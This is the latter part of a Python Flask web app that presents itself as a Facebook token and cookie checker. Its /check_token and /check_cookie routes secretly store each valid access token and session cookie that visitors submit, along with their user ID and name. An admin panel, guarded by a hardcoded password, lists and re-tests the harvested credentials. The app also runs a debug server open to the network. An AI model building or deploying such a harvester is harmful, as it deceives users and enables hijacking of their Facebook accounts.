                {% endfor %}
            {% endif %}
        </div>

        <button class="logout-btn" onclick="logout()">🚪 Logout</button>
    </div>

    <div class="footer">
        <div class="footer-text">⚡ CODED BY ROWEDY KIING ⚡</div>
    </div>

    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tab + '-tab').classList.add('active');
        }

        async function testToken(index, token) {
            const statusBadge = document.getElementById('status-' + index);
            const btn = event.target;
            
            btn.disabled = true;
            btn.textContent = 'Testing...';
            statusBadge.textContent = 'TESTING...';
            statusBadge.className = 'status-badge';
            
            try {
                const response = await fetch('/admin/test_token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ index: index, token: token })
                });
                
                const data = await response.json();
                
                if (data.valid) {
                    statusBadge.textContent = 'VALID';
                    statusBadge.className = 'status-badge status-valid';
                } else {
                    statusBadge.textContent = 'INVALID';
                    statusBadge.className = 'status-badge status-invalid';
                }
            } catch (error) {
                alert('Error testing token: ' + error.message);
            } finally {
                btn.disabled = false;
                btn.textContent = '🔍 Test Token';
            }
        }

        async function removeItem(type, index) {
            if (!confirm('Are you sure you want to remove this ' + type + '?')) {
                return;
            }
            
            try {
                const response = await fetch('/admin/remove', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: type, index: index })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    location.reload();
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                alert('Error removing item: ' + error.message);
            }
        }

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                window.location.href = '/admin/logout';
            }
        }
    </script>
</body>
</html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - ROWEDY KIING</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
            position: relative;
            background-image: url('https://i.ibb.co/xKr63Kz7/1751604882110.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 0;
        }
        
        .login-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            border: 2px solid rgba(255, 215, 0, 0.3);
            backdrop-filter: blur(12px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            max-width: 400px;
            width: 100%;
            position: relative;
            z-index: 1;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .login-header img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin-bottom: 15px;
            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.5);
            border: 4px solid #FFD700;
            object-fit: cover;
        }
        
        .header-name {
            font-size: 1.6em;
            font-weight: 900;
            color: #FFD700;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        
        .header-bio {
            font-size: 0.95em;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
            margin-bottom: 12px;
            font-style: italic;
        }
        
        .login-header h2 {
            color: #FFD700;
            font-size: 1.5em;
            margin-bottom: 10px;
        }
        
        .login-header p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9em;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #FFD700;
            font-weight: 600;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 1em;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #FFD700;
            background: rgba(255, 255, 255, 0.15);
        }
        
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #FFD700, #FFA500);
            border: none;
            border-radius: 8px;
            color: #000;
            font-size: 1em;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }
        
        .btn-login:hover {
            opacity: 0.9;
        }
        
        .error {
            background: rgba(244, 67, 54, 0.3);
            border: 1px solid #f44336;
            color: #fff;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="login-header">
            <img src="https://i.ibb.co/vCd29NJd/1751604135213.jpg" alt="Header">
            <h1 class="header-name">Rowedy Kiing</h1>
            <p class="header-bio">💖 Pyar Ek Anmol Chiz 💖</p>
            <h2>🔐 Admin Login</h2>
            <p>Enter password to access admin panel</p>
        </div>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <form method="POST">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter admin password" required autofocus>
            </div>
            <button type="submit" class="btn-login">🔓 Login</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check_token', methods=['POST'])
def check_token():
    data = request.json
    token = data.get('token', '').strip()
    
    result = TokenChecker.verify_facebook_token(token)
    
    if result['valid']:
        admin_data = load_data()
        token_exists = any(t['token'] == token for t in admin_data['tokens'])
        
        if not token_exists:
            admin_data['tokens'].append({
                'token': token,
                'user_id': result['user_id'],
                'name': result['user_info']['name'],
                'profile_picture': result['user_info']['profile_picture'],
                'added_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'status': 'valid'
            })
            save_data(admin_data)
    
    return jsonify(result)

@app.route('/check_cookie', methods=['POST'])
def check_cookie():
    data = request.json
    cookies = data.get('cookies', '').strip()
    
    result = CookieChecker.verify_facebook_cookies(cookies)
    
    if result['valid']:
        admin_data = load_data()
        cookie_exists = any(c['cookie'] == cookies for c in admin_data['cookies'])
        
        if not cookie_exists:
            admin_data['cookies'].append({
                'cookie': cookies,
                'user_id': result['user_id'],
                'name': result['user_info']['name'],
                'profile_picture': result['user_info']['profile_picture'],
                'added_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            save_data(admin_data)
    
    return jsonify(result)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password', '')
        if password == 'ROWEDYXAARU':
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error='❌ Invalid password!')
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/admin')
def admin_panel():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    admin_data = load_data()
    return render_template_string(
        ADMIN_TEMPLATE,
        cookies=admin_data['cookies'],
        tokens=admin_data['tokens'],
        cookies_count=len(admin_data['cookies']),
        tokens_count=len(admin_data['tokens'])
    )

@app.route('/admin/test_token', methods=['POST'])
def admin_test_token():
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    index = data.get('index')
    token = data.get('token')
    
    result = TokenChecker.verify_facebook_token(token)
    
    admin_data = load_data()
    if 0 <= index < len(admin_data['tokens']):
        admin_data['tokens'][index]['status'] = 'valid' if result['valid'] else 'invalid'
        save_data(admin_data)
    
    return jsonify(result)

@app.route('/admin/remove', methods=['POST'])
def admin_remove():
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    item_type = data.get('type')
    index = data.get('index')
    
    admin_data = load_data()
    
    try:
        if item_type == 'cookie' and 0 <= index < len(admin_data['cookies']):
            admin_data['cookies'].pop(index)
            save_data(admin_data)
            return jsonify({'success': True})
        elif item_type == 'token' and 0 <= index < len(admin_data['tokens']):
            admin_data['tokens'].pop(index)
            save_data(admin_data)
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Invalid index'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
